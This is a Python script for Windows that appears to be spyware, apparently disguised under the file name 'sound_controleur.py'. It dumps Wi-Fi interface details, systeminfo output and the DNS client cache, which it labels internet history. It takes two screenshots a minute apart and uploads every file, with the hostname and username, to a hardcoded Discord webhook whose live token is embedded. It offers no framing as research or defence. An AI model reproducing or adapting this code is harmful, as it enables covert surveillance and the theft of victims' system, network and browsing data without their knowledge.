import sys
import os
import platform
import time
import requests
import socket
import pyautogui


today = time.strftime("%d/%m/%Y")
user = os.getlogin()
hostname = socket.gethostname()

file_path = f"C:\\Users\\{user}\\Documents\\dnsclientcache.txt"
file_path2 = f"C:\\Users\\{user}\\Documents\\wifi.txt"
file_path3 = f"C:\\Users\\{user}\\Documents\\sysinfo.txt"
print(file_path)
print(file_path2)

screenshot_path = f"C:\\Users\\{user}\\Documents\\screenshot.png"
screenshot_path2 = f"C:\\Users\\{user}\\Documents\\screenshot2.png"

webhook_url = "https://discordapp.com/api/webhooks/1355078349000540190/5pbJcL6a0pwsTUPpEYtd3g7JYLzB-nKb366TY4s0tkNo1ZpaQxe0RibifudXf7BOcDGy"

if platform.system() == 'Windows' and sys.platform == 'win32':
    
    os.system(f'netsh wlan show interfaces > {file_path2}"')
    os.system(f'systeminfo > {file_path3}"')
    os.system(f'powershell -Command "get-dnsclientcache > {file_path}"')


    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)


    def send_file_to_webhook(webhook_url, file_path, message):
        with open(file_path, 'rb') as file:
            files = {"file": (os.path.basename(file_path), file)}
            data = {"content": message}
            response = requests.post(webhook_url, data=data, files=files)

            if response.status_code == 200:
                print(f'Fichier {file_path} envoyé avec succès à Discord')
            else:
                print(f'Erreur lors de l\'envoi de {file_path} : {response.status_code}, {response.text}')

    information = "Informations"
    send_file_to_webhook(webhook_url, file_path, f'💡**{information}** :\n\nMachine: **{hostname}**\n\nUtilisateur: **{user}**\n\nExécuté le: **{today}** \n\n:envelope_with_arrow: historique internet :')

    send_file_to_webhook(webhook_url, file_path2, "\n:wireless:  WiFi :")
    
    send_file_to_webhook(webhook_url, file_path3, "\n:desktop: system-info :")

    send_file_to_webhook(webhook_url, screenshot_path, f'📸 Capture d\'écran lors de l execution de **{hostname}** prise le **{today}**')
    
    time.sleep(60)
    screenshot2 = pyautogui.screenshot()
    screenshot2.save(screenshot_path2)
            
    send_file_to_webhook(webhook_url, screenshot_path2, f'📸 Capture d\'écran aprés 60 secondes depuis son éxécution de **{hostname}** prise le **{today}**')
    
    sys.exit()
    
    os.system('taskkill /F /IM python.exe')
else:
    os.system('taskkill /F /IM python.exe')

# py -3.12 c:/Users/Dev/Documents/sound_controleur.py